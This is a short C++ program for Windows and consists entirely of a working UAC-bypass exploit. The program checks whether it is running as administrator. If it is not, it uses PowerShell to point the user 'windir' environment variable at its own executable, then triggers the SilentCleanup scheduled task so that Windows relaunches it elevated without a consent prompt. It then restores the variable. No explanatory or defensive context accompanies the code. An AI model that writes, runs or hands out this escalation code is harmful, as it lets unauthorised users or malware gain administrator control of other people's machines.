#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <iostream>


int giveAdmin()
{
    char buffer[MAX_PATH];
    GetModuleFileNameA(NULL, buffer, MAX_PATH);

    std::string executablePath = buffer;
    std::string fullCommand = "powershell -command \"New-ItemProperty 'HKCU:\\Environment' -Name 'windir' -Value 'c:\\windows\\..\\windows\\system32\\cmd.exe /C \\\"" + executablePath + "\\\";c:\\windows' -PropertyType String -Force; schtasks.exe /Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I; New-ItemProperty 'HKCU:\\Environment' -Name 'windir' -Value 'C:\\WINDOWS' -PropertyType String -Force\"";

    WinExec(fullCommand.c_str(), 7);
    return 0;
}

int main(void)
{
    typedef BOOL(WINAPI* LPFNIUA)(void);

    HMODULE hShell32 = LoadLibrary(_T("shell32.dll"));
    LPFNIUA pIsAdmin = NULL;

    if (hShell32)
    {
        pIsAdmin = (LPFNIUA)GetProcAddress(hShell32, MAKEINTRESOURCEA(680));
        if (pIsAdmin)
        {
            if (pIsAdmin()) {
                std::cout << "We got admin!!!" << std::endl;
                Sleep(5000);
            }
            else {
                giveAdmin();
            }
        }
        FreeLibrary(hShell32);
    }
    return 0;
}